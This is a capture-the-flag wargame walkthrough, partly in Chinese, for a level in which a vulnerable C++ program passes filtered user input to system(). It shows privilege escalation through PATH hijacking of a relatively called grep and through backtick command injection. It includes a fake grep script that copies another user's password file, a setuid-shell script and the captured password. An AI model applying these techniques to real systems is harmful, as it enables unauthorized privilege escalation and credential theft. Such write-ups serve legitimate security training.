level3@blackbox:/tmp/level3$ ls -al
total 1200
drwxr-xr-x   2 level3 gamers    4096 Dec  5 03:38 .
drwx-wx-wt 175 root   root     16384 Dec  5 03:30 ..
-rwxr-xr-x   1 level3 gamers      59 Dec  5 03:30 PID
-rw-r--r--   1 level3 gamers      12 Dec  5 03:30 password
-rwxr-xr-x   1 level3 gamers 1189178 Dec  5 03:30 proclist
-rw-r--r--   1 level3 gamers     490 Dec  5 03:30 proclist.cc
level3@blackbox:/tmp/level3$ 

/* PID */

#!/bin/bash
/bin/touch /tmp/bash
/bin/chmod +sx /tmp/bash

/* proclist.cc */
#include <iostream>
#include <string>

int main(int main, char **argv)
{
        std::string command;
        std::string program;

        std::cout << "Enter the name of the program: ";
        std::cin >> program;

        for(unsigned int i = 0; i < program.length(); i++) {
                if(strchr(";^&|><", program[i]) != NULL) {
                        std::cout << "Fatal error" << std::endl;
                        return 1;
                }
        }


        // Execute the command to list the programs
        command = "/bin/ps |grep ";
        command += program;
        system(command.c_str());

        return 0;
}


system(command.c_str()) 有个很明显的提权漏洞，有两种方法提权：1. grep没有使用绝对路径，因此可以修改PATH
用我们自己的grep替换系统的grep。2.程序虽然会对我们的输入进行过滤，防止执行我们输入的程序，但是程序没有对
"`"进行过滤，因此可以输入一个shell文件： 输入：`getlevel4pass`(注意不要掉了"`")

grep
#!/bin/sh      (注意这里不能使用#!/bin/bash，否则会丢失权限)
/bin/cat /home/level4/password > /tmp/level3/level4_pass

参考可见: http://stackoverflow.com/questions/13209215/bin-sh-does-not-drop-privileges

level3@blackbox:/tmp/level3$ /home/level3/proclist 
Enter the name of the program: a
level3@blackbox:/tmp/level3$ cat level4_pass 
BashingSh
level3@blackbox:/tmp/level3$ 